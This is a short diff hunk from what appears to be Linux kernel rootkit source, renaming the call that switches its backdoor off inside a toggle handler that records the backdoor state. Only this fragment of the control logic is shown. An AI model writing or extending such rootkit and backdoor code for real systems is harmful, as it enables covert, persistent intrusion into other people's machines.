@@ -109,7 +109,7 @@ handle_togglebd(unsigned long arg)
     long sarg = (long)arg;
 
     if (!sarg) {
-        disable_backdoor();
+        unbackdoor();
         rootkit.backdoor = BD_OFF;
         msg = "off";
     } else if (sarg < 0) {
